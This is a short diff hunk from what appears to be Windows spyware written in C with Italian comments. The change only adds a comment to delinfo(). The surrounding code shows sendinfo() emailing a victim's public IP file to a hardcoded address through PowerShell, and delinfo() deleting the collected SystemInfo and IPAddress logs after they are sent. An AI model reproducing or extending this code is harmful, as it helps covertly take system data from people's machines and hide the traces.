@@ -111,7 +111,7 @@ void sendinfo(void) ///Avvia la  powershell ed esegue lo script per inviare l'em
     sendemail(Email_To_Send_From, "Public IP", Password_Of_Sender_Email, "Public IP", Email_To_Recieve_On, "%USERPROFILE%\\AppData\\Roaming\\Logs\\publicip.txt");
 }
 
-void delinfo(void)
+void delinfo(void) //elimina tutti i file post inoltro
 {
     system("del %USERPROFILE%\\AppData\\Roaming\\Logs\\SystemInfo.txt");
     system("del %USERPROFILE%\\AppData\\Roaming\\Logs\\IPAddress.txt");
